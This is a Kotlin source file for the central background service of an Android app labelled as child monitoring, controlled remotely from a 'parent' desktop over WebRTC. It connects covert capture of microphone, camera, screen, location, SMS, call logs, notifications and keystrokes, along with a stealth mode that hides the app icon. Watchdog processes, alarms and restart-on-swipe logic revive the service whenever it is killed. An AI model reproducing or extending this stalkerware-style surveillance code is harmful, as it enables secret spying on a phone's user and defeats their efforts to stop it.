package com.nexus.child.service

import android.app.PendingIntent
import android.app.Service
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.ServiceConnection
import android.content.pm.ServiceInfo
import android.os.Binder
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.ServiceCompat
import androidx.core.content.ContextCompat
import com.nexus.child.components.applock.AppLockCommandHandler
import com.nexus.child.components.applock.AppLockController
import com.nexus.child.components.calllog.CallLogCommandHandler
import com.nexus.child.components.calllog.CallLogController
import com.nexus.child.components.camera.CameraController
import com.nexus.child.components.camera.CameraCommandHandler
import com.nexus.child.components.keyboard.KeyboardCommandHandler
import com.nexus.child.components.keyboard.KeyboardController
import com.nexus.child.components.location.LocationCommandHandler
import com.nexus.child.components.location.LocationController
import com.nexus.child.components.mic.MicCommandHandler
import com.nexus.child.components.mic.MicrophoneController
import com.nexus.child.components.mic.ParentAudioSpeakerManager
import com.nexus.child.components.notification.NotificationCommandHandler
import com.nexus.child.components.notification.NotificationController
import com.nexus.child.components.screen.ScreenCommandHandler
import com.nexus.child.components.screen.ScreenController
import com.nexus.child.components.sms.SmsCommandHandler
import com.nexus.child.components.sms.SmsController
import com.nexus.child.components.stealth.StealthCommandHandler
import com.nexus.child.components.stealth.StealthController
import com.nexus.child.components.storage.StorageCommandHandler
import com.nexus.child.components.storage.StorageController
import com.nexus.child.components.vibrateflash.VibrateFlashCommandHandler
import com.nexus.child.components.vibrateflash.VibrateFlashController
import com.nexus.child.components.wallpaper.WallpaperCommandHandler
import com.nexus.child.components.wallpaper.WallpaperController
import com.nexus.child.service.receiver.ServiceRestartReceiver
import com.nexus.child.service.receiver.UnlockReceiver
import com.nexus.child.service.watchdog.WatchdogService
import com.nexus.child.webrtc.AuthManager
import com.nexus.child.webrtc.DeviceIdManager
import com.nexus.child.webrtc.DeviceStatusManager
import com.nexus.child.webrtc.SignalingClient
import com.nexus.child.webrtc.WebRtcManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.util.concurrent.atomic.AtomicBoolean

/**
 * NexusBackgroundService is the central Foreground Service maintaining the
 * continuous WebRTC surveillance connection, telemetry reporting, and command dispatch pipeline.
 *
 * Hey friend! Here is how this background engine functions:
 * 1. Android Foreground Service: Runs continuously with a low-importance persistent notification,
 *    protecting the process from Linux LowMemoryKiller termination.
 * 2. Background WebRTC Pipeline: Manages anonymous Firebase Authentication, the 12-digit persistent
 *    Child ID, presence status heartbeats, and Non-Trickle ICE WebRTC DataChannel.
 * 3. Decentralized Hardware Controllers: Hosts all 10 device monitoring domains.
 * 4. Dual-Process Mutual Resurrection: Binds to WatchdogService in the isolated :watchdog process.
 *    If MIUI OneKeyClean kills com.nexus.child, :watchdog detects Binder death and resurrects it in <100ms!
 * 5. Proactive Heartbeat Watchdog: Maintains a rolling 25-second RTC hardware alarm in AlarmManager.
 *    If both processes die, the alarm fires and resurrects the engine.
 * 6. Dynamic Unlock Interception: Registers UnlockReceiver at runtime to catch ACTION_USER_PRESENT
 *    without being blocked by Android 8+ manifest restrictions.
 */
class NexusBackgroundService : Service() {

    companion object {
        private const val TAG = "NexusBgService"

        private val isServiceRunning = AtomicBoolean(false)
        private val _isConnected = MutableStateFlow(false)
        private val _deviceId = MutableStateFlow<String?>(null)

        /**
         * Live StateFlow observing whether the child device is actively connected
         * to a parent desktop WebRTC session.
         */
        val isConnected: StateFlow<Boolean> = _isConnected.asStateFlow()

        /**
         * Live StateFlow exposing the persistent 12-digit Child ID once resolved.
         * The UI (MainActivity) can reactively observe this single source of truth.
         */
        val deviceId: StateFlow<String?> = _deviceId.asStateFlow()

        /**
         * Checks whether NexusBackgroundService is currently active.
         */
        fun isRunning(): Boolean = isServiceRunning.get()

        /**
         * Helper function to start the foreground service safely from any Context.
         */
        fun start(context: Context) {
            if (!isServiceRunning.get()) {
                val intent = Intent(context, NexusBackgroundService::class.java)
                try {
                    ContextCompat.startForegroundService(context, intent)
                    Log.d(TAG, "Dispatched startForegroundService for NexusBackgroundService")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to start NexusBackgroundService: ${e.message}", e)
                }
            } else {
                Log.d(TAG, "NexusBackgroundService is already running")
            }
        }

        /**
         * Helper function to cleanly stop the foreground service if needed.
         */
        fun stop(context: Context) {
            val intent = Intent(context, NexusBackgroundService::class.java)
            context.stopService(intent)
        }
    }

    private val localBinder = LocalBinder()
    inner class LocalBinder : Binder() {
        fun getService(): NexusBackgroundService = this@NexusBackgroundService
    }

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var notificationManager: ServiceNotificationManager
    private lateinit var wakeLockManager: WakeLockManager

    private var statusManager: DeviceStatusManager? = null
    private var signalingClient: SignalingClient? = null
    private var webRtcManager: WebRtcManager? = null

    // Dual-process watchdog connection
    private var isBoundToWatchdog = false
    private val isWatchdogBindingInProgress = AtomicBoolean(false)
    private val watchdogConnection = object : ServiceConnection {
        override fun onServiceConnected(name: ComponentName?, service: IBinder?) {
            isBoundToWatchdog = true
            isWatchdogBindingInProgress.set(false)
            Log.d(TAG, "Connected to WatchdogService in :watchdog process")
        }

        override fun onServiceDisconnected(name: ComponentName?) {
            isBoundToWatchdog = false
            isWatchdogBindingInProgress.set(false)
            Log.w(TAG, "WatchdogService in :watchdog died! Resurrecting daemon...")
            bindToWatchdog()
        }

        override fun onBindingDied(name: ComponentName?) {
            isBoundToWatchdog = false
            isWatchdogBindingInProgress.set(false)
            Log.w(TAG, "Binding to WatchdogService died! Resurrecting daemon...")
            bindToWatchdog()
        }
    }

    // Dynamic broadcast receiver for screen unlock
    private var unlockReceiver: UnlockReceiver? = null

    // Proactive watchdog alarm loop
    private var watchdogHeartbeatJob: Job? = null

    // Hardware Monitoring Controllers & Command Handlers
    private var microphoneController: MicrophoneController? = null
    private var parentAudioSpeakerManager: ParentAudioSpeakerManager? = null
    private var micCommandHandler: MicCommandHandler? = null
    private var cameraController: CameraController? = null
    private var cameraCommandHandler: CameraCommandHandler? = null
    private var locationController: LocationController? = null
    private var locationCommandHandler: LocationCommandHandler? = null
    private var callLogController: CallLogController? = null
    private var callLogCommandHandler: CallLogCommandHandler? = null
    private var smsController: SmsController? = null
    private var smsCommandHandler: SmsCommandHandler? = null
    private var vibrateFlashController: VibrateFlashController? = null
    private var vibrateFlashCommandHandler: VibrateFlashCommandHandler? = null
    private var wallpaperController: WallpaperController? = null
    private var wallpaperCommandHandler: WallpaperCommandHandler? = null
    private var storageController: StorageController? = null
    private var storageCommandHandler: StorageCommandHandler? = null
    private var notificationController: NotificationController? = null
    private var notificationCommandHandler: NotificationCommandHandler? = null
    private var screenController: ScreenController? = null
    private var screenCommandHandler: ScreenCommandHandler? = null
    private var keyboardController: KeyboardController? = null
    private var keyboardCommandHandler: KeyboardCommandHandler? = null
    private var stealthController: StealthController? = null
    private var stealthCommandHandler: StealthCommandHandler? = null
    private var appLockController: AppLockController? = null
    private var appLockCommandHandler: AppLockCommandHandler? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Creating NexusBackgroundService...")
        isServiceRunning.set(true)

        // Initialize persistent notification
        notificationManager = ServiceNotificationManager(this)
        notificationManager.createNotificationChannel()

        // Acquire partial wake lock to keep CPU active when display sleeps
        wakeLockManager = WakeLockManager(this)
        wakeLockManager.acquire()

        // Start Foreground Service with declared Android 14+ types (DataSync and Location)
        val notification = notificationManager.buildForegroundNotification(isConnected = false)
        val fgsType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
        } else {
            0
        }

        try {
            ServiceCompat.startForeground(
                this,
                ServiceNotificationManager.NOTIFICATION_ID,
                notification,
                fgsType
            )
            Log.d(TAG, "NexusBackgroundService successfully elevated to foreground service")
        } catch (e: Exception) {
            Log.e(TAG, "Error starting foreground service: ${e.message}", e)
        }

        // Dynamically register UnlockReceiver to avoid Android 8+ manifest implicit broadcast blocks
        registerUnlockReceiver()

        // Establish mutual link with WatchdogService daemon in :watchdog process
        bindToWatchdog()

        // Start proactive heartbeat alarm loop (rolls 25s forward every 15s)
        startWatchdogHeartbeat()

        // Bootstrap the WebRTC and signaling communication engine in background coroutine
        serviceScope.launch {
            bootstrapWebRtcEngine()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "NexusBackgroundService onStartCommand (flags=$flags, startId=$startId)")
        wakeLockManager.acquire()

        if (!isBoundToWatchdog && !isWatchdogBindingInProgress.get()) {
            bindToWatchdog()
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder = localBinder

    override fun onTaskRemoved(rootIntent: Intent?) {
        Log.w(TAG, "App task swiped away from recent apps. Triggering immediate revival...")
        super.onTaskRemoved(rootIntent)

        // 1. Direct PendingIntent restart
        try {
            val restartIntent = Intent(applicationContext, NexusBackgroundService::class.java)
            val pendingIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                PendingIntent.getForegroundService(
                    applicationContext,
                    1,
                    restartIntent,
                    PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
                )
            } else {
                PendingIntent.getService(
                    applicationContext,
                    1,
                    restartIntent,
                    PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
                )
            }
            pendingIntent.send()
            Log.d(TAG, "Dispatched immediate pendingIntent restart on task removed")
        } catch (e: Exception) {
            Log.w(TAG, "Failed to send immediate restart pending intent: ${e.message}")
        }

        // 2. Schedule instant alarm in 250ms via ServiceRestartReceiver
        ServiceRestartReceiver.scheduleRestart(applicationContext, delayMs = 250L)

        // 3. Ensure watchdog process is running
        WatchdogService.start(applicationContext)
    }

    override fun onDestroy() {
        Log.w(TAG, "NexusBackgroundService being destroyed. Scheduling revival & cleaning up...")
        isServiceRunning.set(false)
        _isConnected.value = false

        // Schedule restart fallback alarm to revive in case of unexpected termination
        ServiceRestartReceiver.scheduleRestart(this, delayMs = 1000L)

        watchdogHeartbeatJob?.cancel()
        unregisterUnlockReceiver()
        safeUnbindWatchdog()

        cleanupEngine()
        wakeLockManager.release()
        serviceScope.cancel()
        super.onDestroy()
    }

    /**
     * Binds to WatchdogService in the isolated :watchdog process.
     * Guarded by isWatchdogBindingInProgress to eliminate repeated IPC bind storms.
     */
    private fun bindToWatchdog() {
        if (isBoundToWatchdog || isWatchdogBindingInProgress.getAndSet(true)) {
            Log.d(TAG, "Watchdog binding already active or in progress. Skipping redundant bind call.")
            return
        }
        try {
            WatchdogService.start(applicationContext)
            val intent = Intent(this, WatchdogService::class.java)
            val success = bindService(intent, watchdogConnection, Context.BIND_AUTO_CREATE)
            Log.d(TAG, "bindService to WatchdogService (:watchdog) dispatched (success=$success)")
            if (!success) {
                isWatchdogBindingInProgress.set(false)
            }
        } catch (e: Exception) {
            isWatchdogBindingInProgress.set(false)
            Log.e(TAG, "Error binding to WatchdogService: ${e.message}", e)
        }
    }

    private fun safeUnbindWatchdog() {
        isWatchdogBindingInProgress.set(false)
        if (isBoundToWatchdog) {
            try {
                unbindService(watchdogConnection)
            } catch (e: Exception) {
                Log.w(TAG, "Error unbinding from WatchdogService: ${e.message}")
            } finally {
                isBoundToWatchdog = false
            }
        }
    }

    /**
     * Starts the proactive watchdog alarm loop.
     * Keeps a standing alarm scheduled 25s in the future, refreshed every 15s.
     * If OneKeyClean kills this process, the alarm fires and resurrects the service!
     */
    private fun startWatchdogHeartbeat() {
        watchdogHeartbeatJob?.cancel()
        watchdogHeartbeatJob = serviceScope.launch {
            while (isActive) {
                ServiceRestartReceiver.scheduleHeartbeatWatchdog(this@NexusBackgroundService, delayMs = 25_000L)
                delay(15_000L)
            }
        }
    }

    /**
     * Dynamically registers UnlockReceiver.
     */
    private fun registerUnlockReceiver() {
        if (unlockReceiver == null) {
            try {
                unlockReceiver = UnlockReceiver()
                val filter = IntentFilter(Intent.ACTION_USER_PRESENT).apply {
                    addAction(Intent.ACTION_SCREEN_ON)
                }
                registerReceiver(unlockReceiver, filter)
                Log.d(TAG, "Dynamic UnlockReceiver registered successfully in main process")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to register dynamic UnlockReceiver: ${e.message}", e)
            }
        }
    }

    private fun unregisterUnlockReceiver() {
        unlockReceiver?.let {
            try {
                unregisterReceiver(it)
                Log.d(TAG, "Dynamic UnlockReceiver unregistered")
            } catch (e: Exception) {
                Log.w(TAG, "Error unregistering UnlockReceiver: ${e.message}")
            } finally {
                unlockReceiver = null
            }
        }
    }

    /**
     * Initializes the complete WebRTC, Firebase, Device ID, and signaling pipeline.
     */
    private suspend fun bootstrapWebRtcEngine() {
        try {
            Log.d(TAG, "Step 1: Authenticating Firebase anonymously...")
            AuthManager.ensureAuthenticated(this)

            Log.d(TAG, "Step 2: Resolving persistent 12-digit Device ID...")
            val deviceId = DeviceIdManager.getOrGenerateDeviceId(this)
            _deviceId.value = deviceId
            Log.d(TAG, "Device ID ready for background monitoring: $deviceId")

            Log.d(TAG, "Step 3: Initializing presence status manager...")
            val statusMgr = DeviceStatusManager(deviceId)
            statusManager = statusMgr
            statusMgr.start()

            Log.d(TAG, "Step 4: Initializing signaling client listener...")
            val sigClient = SignalingClient(
                deviceId = deviceId,
                onOfferReceived = { offer ->
                    Log.d(TAG, "Remote SDP offer received from parent. Passing to WebRtcManager...")
                    webRtcManager?.handleRemoteOffer(offer)
                },
                onRenegotiationAnswerReceived = { answer ->
                    Log.d(TAG, "Renegotiation answer received. Passing to WebRtcManager...")
                    webRtcManager?.handleRenegotiationAnswer(answer)
                }
            )
            signalingClient = sigClient
            sigClient.clearSessionData()
            sigClient.startListening()

            Log.d(TAG, "Step 5: Initializing ParentAudioSpeakerManager and WebRtcManager...")
            val speakerMgr = ParentAudioSpeakerManager(this)
            parentAudioSpeakerManager = speakerMgr

            val rtcManager = WebRtcManager(
                context = this,
                deviceStatusManager = statusMgr,
                signalingClient = sigClient,
                onConnectionStateChanged = { connected ->
                    Log.d(TAG, "WebRTC peer connection state changed: connected=$connected")
                    _isConnected.value = connected
                    notificationManager.updateNotification(connected)
                    if (!connected) {
                        resetControllerStates()
                    }
                },
                onMessageReceived = { message ->
                    Log.d(TAG, "Control command received over DataChannel: $message")
                    dispatchCommand(message)
                },
                onRemoteAudioTrackReceived = { audioTrack ->
                    speakerMgr.onRemoteAudioTrackAdded(audioTrack)
                }
            )
            webRtcManager = rtcManager

            // Step 6: Initialize all domain controllers
            initializeHardwareControllers(rtcManager, speakerMgr)

            // Step 7: Push initial stealth mode state immediately when DataChannel opens
            rtcManager.onDataChannelOpened = {
                Log.d(TAG, "WebRTC DataChannel opened. Dispatched initial stealth state to parent...")
                stealthCommandHandler?.sendStatusUpdate()
            }

        } catch (e: Exception) {
            Log.e(TAG, "Failed to bootstrap background WebRTC engine: ${e.message}", e)
        }
    }

    /**
     * Instantiates all 10 hardware monitoring controllers and wires them to WebRtcManager.
     */
    private fun initializeHardwareControllers(
        rtcManager: WebRtcManager,
        speakerMgr: ParentAudioSpeakerManager
    ) {
        // Microphone & Ambient Audio
        val micCtrl = MicrophoneController(
            context = this,
            factoryProvider = { rtcManager.getPeerConnectionFactory() },
            peerConnectionProvider = { rtcManager.getPeerConnection() }
        )
        microphoneController = micCtrl
        micCommandHandler = MicCommandHandler(
            micController = micCtrl,
            parentAudioSpeakerManager = speakerMgr,
            renegotiationTrigger = { onComplete -> rtcManager.performRenegotiation(onComplete) },
            dataSender = { msg -> rtcManager.sendData(msg) }
        )

        // Camera Video Streaming
        val camCtrl = CameraController(
            context = this,
            factoryProvider = { rtcManager.getPeerConnectionFactory() },
            peerConnectionProvider = { rtcManager.getPeerConnection() },
            eglBaseContextProvider = { rtcManager.getEglBaseContext() }
        )
        cameraController = camCtrl
        cameraCommandHandler = CameraCommandHandler(
            cameraController = camCtrl,
            dataSender = { msg -> rtcManager.sendData(msg) }
        )
        rtcManager.setOnPeerConnectionCreatedListener { pc ->
            Log.d(TAG, "PeerConnection created; pre-registering Camera VideoTrack...")
            camCtrl.attachToPeerConnection(pc)
        }

        // GPS Location
        val locCtrl = LocationController(this)
        locationController = locCtrl
        locationCommandHandler = LocationCommandHandler(
            locationController = locCtrl,
            dataSender = { msg -> rtcManager.sendData(msg) }
        )

        // Call Logs
        val callCtrl = CallLogController(this)
        callLogController = callCtrl
        callLogCommandHandler = CallLogCommandHandler(
            callLogController = callCtrl,
            dataSender = { msg -> rtcManager.sendData(msg) }
        )

        // SMS Messages
        val sCtrl = SmsController(this)
        smsController = sCtrl
        smsCommandHandler = SmsCommandHandler(
            smsController = sCtrl,
            dataSender = { msg -> rtcManager.sendData(msg) }
        )

        // Vibration & Torch Flash
        val vfCtrl = VibrateFlashController(this)
        vibrateFlashController = vfCtrl
        vibrateFlashCommandHandler = VibrateFlashCommandHandler(
            controller = vfCtrl,
            dataSender = { msg -> rtcManager.sendData(msg) }
        )

        // Custom Wallpaper
        val wpCtrl = WallpaperController(this)
        wallpaperController = wpCtrl
        wallpaperCommandHandler = WallpaperCommandHandler(
            wallpaperController = wpCtrl,
            dataSender = { msg -> rtcManager.sendData(msg) }
        )

        // Storage & File System
        val stCtrl = StorageController(this)
        storageController = stCtrl
        storageCommandHandler = StorageCommandHandler(
            storageController = stCtrl,
            dataSender = { msg -> rtcManager.sendData(msg) }
        )

        // Notification Interception
        val notifCtrl = NotificationController(this)
        notificationController = notifCtrl
        notificationCommandHandler = NotificationCommandHandler(
            notificationController = notifCtrl,
            dataSender = { msg -> rtcManager.sendData(msg) }
        )

        // Screen Mirroring & System Audio
        val scrCtrl = ScreenController(
            context = this,
            factoryProvider = { rtcManager.getPeerConnectionFactory() },
            peerConnectionProvider = { rtcManager.getPeerConnection() },
            eglBaseContextProvider = { rtcManager.getEglBaseContext() },
            dataSender = { msg -> rtcManager.sendData(msg) }
        )
        screenController = scrCtrl
        screenCommandHandler = ScreenCommandHandler(
            screenController = scrCtrl,
            dataSender = { msg -> rtcManager.sendData(msg) }
        )

        // Keyboard & Keystroke Auditing
        val kbCtrl = KeyboardController(this)
        keyboardController = kbCtrl
        keyboardCommandHandler = KeyboardCommandHandler(
            keyboardController = kbCtrl,
            dataSender = { msg -> rtcManager.sendData(msg) }
        )

        // Stealth Mode & Launcher Component Visibility
        val sthCtrl = StealthController(this)
        stealthController = sthCtrl
        val sthCmdHandler = StealthCommandHandler(
            stealthController = sthCtrl,
            dataSender = { msg -> rtcManager.sendData(msg) }
        )
        stealthCommandHandler = sthCmdHandler

        // Synchronize widget toggles across active WebRTC session
        StealthController.registerGlobalListener { isStealth ->
            val statusMsg = if (isStealth) StealthCommandHandler.STATUS_STEALTH_ON else StealthCommandHandler.STATUS_STEALTH_OFF
            rtcManager.sendData(statusMsg)
            Log.d(TAG, "Global stealth listener dispatched to parent: $statusMsg")
        }

        // App Lock Security & Remote Overrides
        val alCtrl = AppLockController(
            context = this,
            dataSender = { msg -> rtcManager.sendData(msg) }
        )
        appLockController = alCtrl
        appLockCommandHandler = AppLockCommandHandler(
            context = this,
            controller = alCtrl,
            dataSender = { msg -> rtcManager.sendData(msg) }
        )

        Log.d(TAG, "All 13 hardware monitoring controllers successfully initialized in background")
    }

    /**
     * Routes incoming DataChannel commands from the desktop parent console to the appropriate domain handler.
     */
    private fun dispatchCommand(command: String) {
        val handled = cameraCommandHandler?.handleCommand(command) == true ||
                micCommandHandler?.handleCommand(command) == true ||
                locationCommandHandler?.handleCommand(command) == true ||
                callLogCommandHandler?.handleCommand(command) == true ||
                smsCommandHandler?.handleCommand(command) == true ||
                vibrateFlashCommandHandler?.handleCommand(command) == true ||
                wallpaperCommandHandler?.handleCommand(command) == true ||
                storageCommandHandler?.handleCommand(command) == true ||
                notificationCommandHandler?.handleCommand(command) == true ||
                screenCommandHandler?.handleCommand(command) == true ||
                keyboardCommandHandler?.handleCommand(command) == true ||
                stealthCommandHandler?.handleCommand(command) == true ||
                appLockCommandHandler?.handleCommand(command) == true

        if (!handled) {
            Log.d(TAG, "Unhandled command ignored: $command")
        }
    }

    /**
     * Resets active streaming / monitoring controller states upon disconnection.
     */
    private fun resetControllerStates() {
        cameraCommandHandler?.onPeerDisconnected()
        micCommandHandler?.onPeerDisconnected()
        locationCommandHandler?.onPeerDisconnected()
        callLogCommandHandler?.onPeerDisconnected()
        smsCommandHandler?.onPeerDisconnected()
        vibrateFlashCommandHandler?.onPeerDisconnected()
        wallpaperCommandHandler?.onPeerDisconnected()
        storageCommandHandler?.cleanup()
        notificationCommandHandler?.onPeerDisconnected()
        screenCommandHandler?.onPeerDisconnected()
        keyboardCommandHandler?.onPeerDisconnected()
        appLockCommandHandler?.onPeerDisconnected()
    }

    /**
     * Tears down all active resources when the service is stopped.
     */
    private fun cleanupEngine() {
        appLockCommandHandler?.cleanup()
        appLockController?.cleanup()
        keyboardCommandHandler?.cleanup()
        keyboardController?.cleanup()
        stealthCommandHandler?.cleanup()
        StealthController.registerGlobalListener(null)
        notificationCommandHandler?.cleanup()
        notificationController?.cleanup()
        screenCommandHandler?.cleanup()
        screenController?.cleanup()
        storageCommandHandler?.cleanup()
        storageController?.cleanup()
        wallpaperCommandHandler?.cleanup()
        wallpaperController?.cleanup()
        vibrateFlashCommandHandler?.cleanup()
        vibrateFlashController?.cleanup()
        smsCommandHandler?.cleanup()
        smsController?.cleanup()
        callLogCommandHandler?.cleanup()
        callLogController?.cleanup()
        locationCommandHandler?.cleanup()
        locationController?.cleanup()
        cameraCommandHandler?.cleanup()
        cameraController?.cleanup()
        micCommandHandler?.cleanup()
        parentAudioSpeakerManager?.cleanup()
        microphoneController?.cleanup()

        webRtcManager?.close()
        signalingClient?.stop()
        statusManager?.stop()
    }
}
